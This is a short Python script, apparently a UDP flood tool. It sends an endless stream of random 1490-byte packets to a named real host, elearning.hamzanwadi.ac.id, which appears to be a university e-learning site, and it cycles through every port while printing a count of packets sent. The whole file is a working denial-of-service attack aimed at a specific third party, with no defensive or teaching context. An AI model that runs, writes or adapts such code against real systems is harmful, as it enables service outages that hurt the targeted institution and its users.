import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
ip = "elearning.hamzanwadi.ac.id"
port = int(80)

os.system("clear")
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print("Sent {} packet to {} through port:{}".format(sent, ip, port))
    if port == 65534:
        port = 1
